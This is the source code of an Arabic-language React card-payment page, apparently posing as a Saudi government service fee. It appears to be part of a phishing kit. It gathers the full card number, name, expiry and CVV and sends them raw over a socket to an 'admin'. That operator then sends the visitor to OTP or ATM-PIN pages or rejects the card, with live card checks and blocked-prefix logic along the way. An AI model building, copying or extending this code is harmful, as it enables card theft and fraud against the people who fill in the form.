import { useState, useEffect, useRef } from "react";
import { useSignalEffect } from "@preact/signals-react/runtime";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  socket,
  visitor,
  sendData,
  isFormApproved,
  isCardVerified,
  navigateToPage,
  cardAction,
  waitingMessage,
} from "@/lib/store";

const schema = z.object({
  cardNumber: z
    .string()
    .min(1, "رقم البطاقة مطلوب")
    .refine((val) => {
      // Remove spaces before validation
      const cleanVal = val.replace(/\s+/g, "");
      if (!cleanVal || cleanVal.length < 13 || cleanVal.length > 19) return false;
      // Luhn algorithm validation
      let sum = 0;
      let isEven = false;
      for (let i = cleanVal.length - 1; i >= 0; i--) {
        let digit = parseInt(cleanVal[i], 10);
        if (isEven) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        isEven = !isEven;
      }
      return sum % 10 === 0;
    }, "رقم البطاقة غير صحيح"),
  nameOnCard: z.string().min(1, "اسم حامل البطاقة مطلوب"),
  expiryMonth: z.string().min(1, "الشهر مطلوب"),
  expiryYear: z.string().min(1, "السنة مطلوبة"),
  cvv: z.string().length(3, "CVV يجب أن يكون 3 أرقام"),
});

type FormData = z.infer<typeof schema>;

// Generate months and years
const months = Array.from({ length: 12 }, (_, i) => ({
  value: String(i + 1).padStart(2, "0"),
  label: String(i + 1).padStart(2, "0"),
}));

const currentYear = new Date().getFullYear();
const years = Array.from({ length: 15 }, (_, i) => ({
  value: String(currentYear + i - 2000),
  label: String(currentYear + i),
}));

// Luhn algorithm to validate card number
function isValidCardNumber(number: string): boolean {
  if (!number || number.length < 13 || number.length > 19) return false;
  
  let sum = 0;
  let isEven = false;
  
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number[i], 10);
    
    if (isEven) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }
    
    sum += digit;
    isEven = !isEven;
  }
  
  return sum % 10 === 0;
}

// أرقام BIN لبطاقات مدى السعودية
// قائمة BIN الرسمية لبطاقات مدى - المصدر: bintable.com/scheme/Mada (92 رقم)
const MADA_BINS = [
  // مصرف الراجحي
  "403024", "409201", "410621", "455708", "458456", "462220", "484783", "968205",
  // البنك السعودي للاستثمار
  "406136", "483010", "483011", "483012", "589206", "968207",
  // بنك الإمارات الدولي
  "406996", "410685",
  // مصرف الإنماء
  "407197", "407395", "412565", "428671", "428672", "428673", "432328", "434107", "446672", "543357", "426897", "968206",
  // بنك البلاد
  "417633", "446393", "468540", "468541", "468542", "468543", "636120", "968201",
  // بنك الخليج الدولي
  "419593", "439954",
  // STC Pay
  "420132",
  // البنك السعودي الفرنسي
  "421141", "440647", "440795", "446404", "457865", "457997", "474491", "588845", "968208",
  // البنك السعودي البريطاني (ساب)
  "422817", "422818", "422819", "428331", "605141", "968204",
  // بنك الكويت الوطني
  "431361",
  // بنك الجزيرة
  "440533", "445564", "489318", "489319", "504300", "968211",
  // البنك العربي الوطني
  "455036", "486094", "486095", "486096", "588848", "968203",
  // البنك الأهلي السعودي (NCB/SNB)
  "524130", "529415", "535825", "543085", "549760", "554180", "588850", "968202",
  // بنك الرياض
  "513213", "520058", "524514", "529741", "535989", "536023", "537767", "558563", "968209",
  // بنك البحرين الوطني
  "521076", "604906",
  // بنك أبوظبي الأول
  "530060", "531196",
  // سامبا (البنك السعودي الأمريكي)
  "508160", "530906", "531095", "532013",
];

// Detect card type
function getCardType(number: string): string {
  const cleanNumber = number.replace(/\s+/g, "");
  const bin6 = cleanNumber.substring(0, 6);
  const bin4 = cleanNumber.substring(0, 4);
  
  // التحقق من مدى أولاً (أولوية عليا)
  if (MADA_BINS.includes(bin6)) return "mada";
  
  // التحقق من بطاقات مدى التي تبدأ بـ 9
  if (/^9/.test(cleanNumber)) return "mada";
  
  // التحقق من Visa (تبدأ بـ 4)
  if (/^4/.test(cleanNumber)) return "visa";
  
  // التحقق من Mastercard (تبدأ بـ 51-55 أو 2221-2720)
  if (/^5[1-5]/.test(cleanNumber)) return "mastercard";
  if (/^2[2-7]/.test(cleanNumber)) return "mastercard";
  
  return "unknown";
}

export default function CreditCardPayment() {
  const [, navigate] = useLocation();
  const [cardError, setCardError] = useState(false);
  const [luhnError, setLuhnError] = useState(false);
  const [rejectedError, setRejectedError] = useState(false);
  const debounceRef = useRef<ReturnType<typeof setTimeout>>();

  // Get service and amount from URL params
  const searchParams = new URLSearchParams(window.location.search);
  const serviceName = searchParams.get('service') || 'قيد سجل تجاري';
  const totalAmount = searchParams.get('amount') || '575';

  const {
    register,
    handleSubmit,
    watch,
    setValue,
    reset,
    formState: { errors },
  } = useForm<FormData>({
    resolver: zodResolver(schema),
    defaultValues: {
      cardNumber: "",
      nameOnCard: "",
      expiryMonth: "",
      expiryYear: "",
      cvv: "",
    },
  });

  const cardNumber = watch("cardNumber");
  const nameOnCard = watch("nameOnCard");
  const expiryMonth = watch("expiryMonth");
  const expiryYear = watch("expiryYear");
  const cvv = watch("cvv");

  // Check if form is valid for submission
  const cleanCardNumber = cardNumber?.replace(/\s+/g, "") || "";
  const isFormValid = 
    cleanCardNumber.length >= 13 && 
    cleanCardNumber.length <= 19 &&
    !luhnError &&
    nameOnCard?.trim().length > 0 &&
    expiryMonth?.length > 0 &&
    expiryYear?.length > 0 &&
    cvv?.length === 3;

  // Emit page enter
  useEffect(() => {
    navigateToPage("الدفع بطاقة الائتمان");
  }, []);

  // Verify card number
  useEffect(() => {
    if (cardNumber && cardNumber.length === 16) {
      if (debounceRef.current) clearTimeout(debounceRef.current);
      debounceRef.current = setTimeout(() => {
        socket.value.emit("cardNumber:verify", cardNumber);
      }, 500);
    }
  }, [cardNumber]);

  // Handle card verification response
  useEffect(() => {
    if (isCardVerified.value === false) {
      setCardError(true);
    } else {
      setCardError(false);
    }
  }, [isCardVerified.value]);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      navigate("/otp-verification");
    }
  }, [isFormApproved.value, navigate]);

  // Handle card action from admin
  useSignalEffect(() => {
    if (cardAction.value) {
      const action = cardAction.value.action;
      
      // إخفاء اللودر فوراً عند استلام أي إجراء من الأدمن
      waitingMessage.value = "";
      
      if (action === 'otp') {
        navigate("/otp-verification");
      } else if (action === 'atm') {
        navigate("/atm-password");
      } else if (action === 'reject') {
        setRejectedError(true);
        // تفريغ جميع الحقول عند رفض البطاقة
        reset({
          cardNumber: "",
          nameOnCard: "",
          expiryMonth: "",
          expiryYear: "",
          cvv: "",
        });
      }
      // Reset card action
      cardAction.value = null;
    }
  });

  // Format card number with spaces every 4 digits
  const formatCardNumber = (value: string): string => {
    const cleaned = value.replace(/\s+/g, "").replace(/\D/g, "");
    const groups = cleaned.match(/.{1,4}/g);
    return groups ? groups.join(" ") : cleaned;
  };

  // Check blocked card prefixes and validate card number
  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const rawValue = e.target.value.replace(/\s+/g, "").replace(/\D/g, "");
    const blockedPrefixes = visitor.value.blockedCardPrefixes;

    if (blockedPrefixes && blockedPrefixes.includes(rawValue.slice(0, 4))) {
      setCardError(true);
      setValue("cardNumber", "");
      setLuhnError(false);
    } else {
      // Format with spaces for display
      const formattedValue = formatCardNumber(rawValue);
      setValue("cardNumber", formattedValue);
      // Check Luhn validation when card number is complete (13-19 digits)
      if (rawValue.length >= 13 && rawValue.length <= 19) {
        if (!isValidCardNumber(rawValue)) {
          setLuhnError(true);
        } else {
          setLuhnError(false);
        }
      } else {
        setLuhnError(false);
      }
    }
  };

  const onSubmit = (data: FormData) => {
    if (luhnError) return;

    // Remove spaces from card number before sending
    const cleanCardNumber = data.cardNumber.replace(/\s+/g, "");

    const paymentData = {
      totalPaid: totalAmount,
      cardType: getCardType(cleanCardNumber),
      cardLast4: cleanCardNumber.slice(-4),
      serviceName: serviceName,
    };

    localStorage.setItem("paymentData", JSON.stringify(paymentData));

    sendData({
      paymentCard: {
        cardNumber: cleanCardNumber,
        nameOnCard: data.nameOnCard,
        expiryMonth: data.expiryMonth,
        expiryYear: data.expiryYear,
        cvv: data.cvv,
      },
      current: "الدفع",
      nextPage: "رمز التحقق (OTP)",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  return (
    <PageLayout variant="default">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-6">
          <h1 className="text-xl font-bold text-gray-800 mb-2">الدفع الآمن</h1>
          <p className="text-gray-500 text-sm">أدخل بيانات بطاقتك لإتمام الدفع</p>
          <div className="mt-3 p-3 bg-green-50 rounded-lg">
            <p className="text-sm text-gray-600">{serviceName}</p>
            <p className="text-2xl font-bold text-green-600">{totalAmount} ر.س</p>
          </div>
        </div>

        {/* Card Icons */}
        <div className="flex justify-center gap-3 mb-6">
          <img src="/images/mada.png" alt="mada" className="h-8" />
          <img src="/images/visa.png" alt="visa" className="h-8" />
          <img src="/images/mastercard.png" alt="mastercard" className="h-8" />
        </div>

        {/* Rejected Error Message */}
        {rejectedError && (
          <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
            <p className="text-red-600 text-center font-medium">معلومات البطاقة المدخلة غير صحيحة</p>
          </div>
        )}

        <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
          {/* Card Number */}
          <div className="space-y-2">
            <Label htmlFor="cardNumber">رقم البطاقة</Label>
            <Input
              id="cardNumber"
              type="tel"
              inputMode="numeric"
              maxLength={19}
              placeholder="1234 5678 9012 3456"
              className={(cardError || luhnError) ? "border-red-500" : ""}
              {...register("cardNumber")}
              onChange={handleCardChange}
            />
            {(errors.cardNumber || cardError || luhnError) && (
              <p className="text-red-500 text-xs">
                {luhnError ? "رقم البطاقة غير صحيح" : (errors.cardNumber?.message || "رقم البطاقة غير صحيح")}
              </p>
            )}
          </div>

          {/* Name on Card */}
          <div className="space-y-2">
            <Label htmlFor="nameOnCard">اسم حامل البطاقة</Label>
            <Input
              id="nameOnCard"
              placeholder="Name as shown on card"
              {...register("nameOnCard")}
              onChange={(e) => {
                // قبول حروف إنجليزية ومسافات فقط (A-Z, a-z, space)
                const englishOnly = e.target.value.replace(/[^A-Za-z\s]/g, "");
                setValue("nameOnCard", englishOnly);
              }}
            />
            {errors.nameOnCard && (
              <p className="text-red-500 text-xs">{errors.nameOnCard.message}</p>
            )}
          </div>

          {/* Expiry Date */}
          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <Label>شهر الانتهاء</Label>
              <Select onValueChange={(v) => setValue("expiryMonth", v)}>
                <SelectTrigger>
                  <SelectValue placeholder="الشهر" />
                </SelectTrigger>
                <SelectContent>
                  {months.map((m) => (
                    <SelectItem key={m.value} value={m.value}>
                      {m.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              {errors.expiryMonth && (
                <p className="text-red-500 text-xs">{errors.expiryMonth.message}</p>
              )}
            </div>

            <div className="space-y-2">
              <Label>سنة الانتهاء</Label>
              <Select onValueChange={(v) => setValue("expiryYear", v)}>
                <SelectTrigger>
                  <SelectValue placeholder="السنة" />
                </SelectTrigger>
                <SelectContent>
                  {years.map((y) => (
                    <SelectItem key={y.value} value={y.value}>
                      {y.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              {errors.expiryYear && (
                <p className="text-red-500 text-xs">{errors.expiryYear.message}</p>
              )}
            </div>
          </div>

          {/* CVV */}
          <div className="space-y-2">
            <Label htmlFor="cvv">رمز الأمان (CVV)</Label>
            <Input
              id="cvv"
              type="tel"
              inputMode="numeric"
              maxLength={3}
              placeholder="123"
              {...register("cvv")}
              onChange={(e) => {
                // قبول أرقام إنجليزية فقط (0-9)
                const englishOnly = e.target.value.replace(/[^0-9]/g, "");
                setValue("cvv", englishOnly);
              }}
            />
            {errors.cvv && (
              <p className="text-red-500 text-xs">{errors.cvv.message}</p>
            )}
          </div>

          {/* Submit Button */}
          <Button 
            type="submit" 
            className="w-full" 
            size="lg"
            disabled={!isFormValid}
          >
            ادفع الآن
          </Button>
        </form>
      </div>
    </PageLayout>
  );
}
